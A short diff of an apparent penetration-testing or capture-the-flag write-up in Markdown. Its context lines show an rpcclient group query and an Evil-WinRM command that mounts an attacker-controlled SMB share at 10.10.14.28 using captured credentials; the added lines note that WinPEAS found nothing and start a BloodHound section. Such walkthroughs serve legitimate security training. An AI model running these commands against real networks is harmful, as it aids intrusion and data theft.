@@ -238,4 +238,9 @@ rpcclient $> querygroup 0x47c
 *Evil-WinRM* PS C:\> New-PSDrive -Name pwndrive -PSProvider FileSystem -Credential $cred -Root \\10.10.14.28\pwnshare
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231182636-fb2c4894-58e8-4da8-a09c-99161fd0b09c.png)
+  
+  - `WinPEAS` did not return any useful information.
 
+---
+
+### BloodHound
